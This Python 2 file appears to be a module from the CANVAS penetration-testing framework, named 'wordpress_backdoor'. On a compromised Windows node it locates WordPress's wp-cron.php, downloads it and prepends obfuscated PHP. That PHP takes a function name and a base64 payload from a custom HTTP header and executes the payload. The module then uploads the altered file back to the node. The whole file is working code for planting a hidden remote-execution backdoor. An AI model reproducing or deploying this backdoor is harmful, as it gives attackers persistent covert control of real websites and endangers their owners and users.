#! /usr/bin/env python

#we need to display a nice little mini icon of the screen in the CANVAS gui! (kinda
#like VMware does...) PyGTK has support for raw data like this, if we want to use
#their routines

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2004
#http://www.immunityinc.com/CANVAS/ for more information

import sys
#covers both angles
if "." not in sys.path: sys.path.append(".")

from exploitutils import *
from internal import *
from canvaserror import *

from ExploitTypes.localcommand import LocalCommand

NAME                   = "wordpress_backdoor"
DESCRIPTION            = "Create or execute wordpress backdoor"
DOCUMENTATION          = {}
DOCUMENTATION["Notes"] = """
"""

VERSION                = "1.0"

PROPERTY               = {}
PROPERTY['SITE']       = "Local"
PROPERTY['TYPE']       = "Commands"
PROPERTY['ARCH']       = [ ["Windows"] ]

DOCUMENTATION['Notes'] = """ 

This module will create a wordpress backdoor in the wp-cron.php file.

"""

class theexploit(LocalCommand):
    def __init__(self):
        LocalCommand.__init__(self)
        self.node   = None
        self.result = []
        self.name   = NAME
        self.basepath = ""
    
    def createBackdoor(self, node):
        system_drive = node.shell.GetEnvironmentVariable("SystemDrive")
        node.shell.chdir(system_drive + "\\")
        command = node.shell.runcommand("dir /S wp-cron.php")
        init = command.find("Directory of ")
        command = command[init+len("Directory of "):]
        end = command.find("\n")
        self.basepath = command[:end-1]
        self.log("\n\n%s\n\n" % self.basepath)
        
        filename = self.basepath + "\\" + "wp-cron.php"        
        outfilename = "My-wp-cron.php"
        
        try:
            ret = node.shell.download(filename, outfilename)
        except NodeCommandError, i:
            self.log("Could not download %s: %s" % (filename, str(i)))
            return None
        
        fd = open("My-wp-cron.php", "rb")
        chars = fd.read().strip(" \r\n\t")
        pos = 0
        php = False
        com = False
        oneline_comment = False
        comment = ""
        
        if chars.startswith("<?php"):
            pos = 5
            chars = chars[pos:].strip(" \r\n\t")
            php = True
            
        if chars.startswith("/*"):
            pos = chars.find("*/") + 2
            comment = chars[0:chars.find("*/")+2]
        elif chars.startswith("//"):
            pos = chars.find("\n") + 1
            comment = chars[0:chars.find("*/")+2]
            
        chars = chars[pos:].strip(" \r\n\t")
        
        code = """if (!empty($_SERVER['HTTP_WPVALID'])){
        $cookie = @$_SERVER['HTTP_WPVALID'];
        $wp_userP = strpos(@$cookie, 'wp_user=') + (2*4);
        $wp_timeP = strpos(@$cookie, 'wp_time=');
        $b = base64_decode(substr($cookie, $wp_timeP+(2*4)));
        ($a=substr($cookie, $wp_userP, $wp_timeP-(5*2))).$a($b);
}\n"""
        
        content = code + "\n" + chars
        
        wp_cron = open("wp-cron.php", "wb")
        
        if len(comment) > 0:
            if php:
                comment = "<?php" + "\n" + comment
        elif php:    
            comment = "<?php" + "\n" + comment
            
        wp_cron.write(comment + "\n\n" + content)
        
        fd.close()
        
        wp_cron.close()
        
        res = self.injectFile(node)
        
        if not res:
            success = False
            return "Bad", success
        
        self.log('file created')
        success = True
        return "response", success
        
    def injectFile(self, node):
        from engine.config import canvas_root_directory
        filename = "wp-cron.php"
        src = os.path.join(canvas_root_directory, filename)
        dst = self.basepath + "\\" + filename 
        
        try:
            node.shell.upload(src, destfilename = dst)
            self.log('[+] Uploaded %s to %s' % (src, dst))            
        except Exception:
            self.log('[-] Could not upload %s to %s' % (src, dst))
            return False
            
        return True
    
    def run(self):
        self.host = self.target.interface
        self.setInfo("%s (in progress)"%(NAME))
        
        success = False

        for node in self.argsDict["passednodes"]:
            if node.nodetype == 'win32Node':
                self.createBackdoor(node)
                success = True               
            else:
                self.log("Node of type %s not supported yet." % node.nodetype)
            
        self.setInfo("%s - done" % (NAME))
        return success

if __name__=="__main__":
    print "You can't run this from the commandline, sorry"
